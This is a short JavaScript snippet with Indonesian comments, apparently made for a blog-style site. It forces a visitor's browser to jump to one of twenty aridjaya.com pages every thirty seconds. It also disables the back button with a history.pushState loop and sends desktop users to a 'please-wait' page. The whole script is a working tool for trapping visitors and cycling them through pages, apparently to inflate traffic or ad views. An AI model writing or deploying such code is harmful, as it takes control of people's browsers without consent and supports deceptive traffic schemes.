/* LANJUT KE E */
(function(){
setInterval(function(){
var redSites = [
"https://www.aridjaya.com/p/e-1.html",
"https://www.aridjaya.com/p/e-2.html",
"https://www.aridjaya.com/p/e-3.html",
"https://www.aridjaya.com/p/e-4.html",
"https://www.aridjaya.com/p/e-5.html",
"https://www.aridjaya.com/p/e-6.html",
"https://www.aridjaya.com/p/e-7.html",
"https://www.aridjaya.com/p/e-8.html",
"https://www.aridjaya.com/p/e-9.html",
"https://www.aridjaya.com/p/e-10.html",
"https://www.aridjaya.com/p/e-11.html",
"https://www.aridjaya.com/p/e-12.html",
"https://www.aridjaya.com/p/e-13.html",
"https://www.aridjaya.com/p/e-14.html",
"https://www.aridjaya.com/p/e-15.html",
"https://www.aridjaya.com/p/e-16.html",
"https://www.aridjaya.com/p/e-17.html",
"https://www.aridjaya.com/p/e-18.html",
"https://www.aridjaya.com/p/e-19.html",
"https://www.aridjaya.com/p/e-20.html",
];
var randomLinks = redSites[Math.floor(Math.random()*redSites.length)];
window.location = randomLinks
},30000)
}());
/* JANGAN KEMBALI */
history.pushState(null, null, '#');
window.addEventListener('popstate', function(event){
history.pushState(null, null, '#');     
});
/* JIKA PAKAI PC */
if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i)) || (navigator.userAgent.indexOf('Android') != -1)){}
else location.replace("https://www.aridjaya.com/p/please-wait.html");
